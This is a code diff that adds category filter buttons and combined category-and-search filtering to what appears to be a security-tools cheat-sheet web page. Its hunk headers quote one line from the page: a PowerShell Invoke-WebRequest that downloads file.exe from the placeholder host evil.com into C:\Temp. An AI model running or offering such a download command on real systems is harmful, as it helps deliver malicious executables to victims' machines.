@@ -26,6 +26,16 @@
         </div>
     </div>
 
+    <!-- Category Filters -->
+    <div class="button-container search-container">
+        <button class="button filter-btn" data-cat="all" aria-pressed="true">All</button>
+        <button class="button button-secondary filter-btn" data-cat="net" aria-pressed="false">Networking</button>
+        <button class="button button-secondary filter-btn" data-cat="web" aria-pressed="false">Web</button>
+        <button class="button button-secondary filter-btn" data-cat="exp" aria-pressed="false">Exploitation</button>
+        <button class="button button-secondary filter-btn" data-cat="for" aria-pressed="false">Forensics</button>
+        <button class="button button-secondary filter-btn" data-cat="osint" aria-pressed="false">OSINT</button>
+    </div>
+
     <div id="toolsGrid" class="grid-container">
         <!-- No Results Message -->
         <div id="noResults" class="no-results hidden">
@@ -314,35 +324,29 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
     const toolCards = document.querySelectorAll('.tool-card');
     const clearBtn = document.getElementById('clearSearch');
     const noResults = document.getElementById('noResults');
-
-    // Performance Optimization: Cache DOM queries and content
-    const toolsData = Array.from(toolCards).map(card => {
-        const titleElement = card.querySelector('.tool-title');
-        const descElement = card.querySelector('.tool-desc');
-        const flagsElement = card.querySelector('.tool-flags');
-
-        return {
-            element: card,
-            title: titleElement ? titleElement.textContent.toLowerCase() : '',
-            keywords: card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '',
-            desc: descElement ? descElement.textContent.toLowerCase() : '',
-            flags: flagsElement ? flagsElement.textContent.toLowerCase() : ''
-        };
-    });
+    const filterBtns = document.querySelectorAll('.filter-btn');
+    let currentCategory = 'all';
 
     function filterTools(searchTerm) {
         searchTerm = searchTerm.toLowerCase();
         let hasResults = false;
 
-        toolsData.forEach(tool => {
-            if (tool.title.includes(searchTerm) ||
-                tool.keywords.includes(searchTerm) ||
-                tool.desc.includes(searchTerm) ||
-                tool.flags.includes(searchTerm)) {
-                tool.element.classList.remove('hidden');
+        toolCards.forEach(card => {
+            const title = card.querySelector('.tool-title').textContent.toLowerCase();
+            const keywords = card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '';
+            const desc = card.querySelector('.tool-desc').textContent.toLowerCase();
+            const flags = card.querySelector('.tool-flags') ? card.querySelector('.tool-flags').textContent.toLowerCase() : '';
+
+            // Check Category
+            const categoryMatch = currentCategory === 'all' || card.querySelector('.cat-' + currentCategory);
+            // Check Search
+            const searchMatch = title.includes(searchTerm) || keywords.includes(searchTerm) || desc.includes(searchTerm) || flags.includes(searchTerm);
+
+            if (categoryMatch && searchMatch) {
+                card.classList.remove('hidden');
                 hasResults = true;
             } else {
-                tool.element.classList.add('hidden');
+                card.classList.add('hidden');
             }
         });
 
@@ -361,9 +365,41 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         }
     }
 
-    // Check for query parameter
+    function setCategory(cat) {
+        currentCategory = cat;
+
+        // Update Buttons
+        filterBtns.forEach(btn => {
+            if (btn.getAttribute('data-cat') === cat) {
+                btn.classList.remove('button-secondary');
+                btn.classList.add('button');
+                btn.setAttribute('aria-pressed', 'true');
+            } else {
+                btn.classList.add('button-secondary');
+                btn.classList.remove('button');
+                btn.setAttribute('aria-pressed', 'false');
+            }
+        });
+
+        filterTools(searchInput.value);
+    }
+
+    // Event Listeners for Filters
+    filterBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            setCategory(btn.getAttribute('data-cat'));
+        });
+    });
+
+    // Check for query parameters
     const urlParams = new URLSearchParams(window.location.search);
     const query = urlParams.get('q');
+    const categoryParam = urlParams.get('category');
+
+    if (categoryParam) {
+        setCategory(categoryParam);
+    }
+
     if (query) {
         searchInput.value = query;
         filterTools(query);
